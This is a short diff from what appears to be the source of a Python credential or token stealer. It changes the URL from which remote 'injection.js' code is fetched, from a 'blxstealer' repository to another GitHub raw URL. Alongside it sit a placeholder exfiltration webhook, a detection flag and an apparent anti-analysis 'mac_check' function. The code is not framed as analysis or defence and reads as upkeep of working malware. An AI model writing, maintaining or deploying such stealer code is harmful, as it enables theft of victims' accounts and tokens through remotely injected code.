@@ -535,7 +535,7 @@ def mac_check():
 
 
 hook = "YOUR WEBHOOK HERE"
-inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/main/index.js"
+inj3c710n_url = "https://raw.githubusercontent.com/negawaatt/main/main/main/injection.js"
 color =  0x812118
 DETECTED = False
 
